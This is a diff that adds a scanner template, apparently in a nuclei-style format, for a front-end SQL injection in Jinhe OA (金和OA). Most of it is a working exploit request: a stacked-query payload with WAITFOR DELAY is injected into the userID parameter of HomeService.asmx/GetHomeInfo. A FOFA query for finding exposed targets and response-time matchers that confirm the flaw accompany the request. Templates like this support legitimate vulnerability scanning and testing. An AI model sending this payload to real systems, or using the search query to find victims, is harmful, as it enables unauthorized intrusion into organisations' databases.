@@ -1,0 +1,26 @@
+## id: VEID-2024-0106
+## name: 金和OA_HomeService.asmxSQL注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description:金和OA前台SQL注入
+## fofa-query: app="金和网络-金和OA"
+## verification: true
+
+
+
+GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:7%27-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: response_time > 7
+
+
+
+
+
+# @VEIL-STAMP: f6f0c5e3d2f129d0df7126fecaf28f0fdd73f322eb5687d728cb409dc9b56e1c
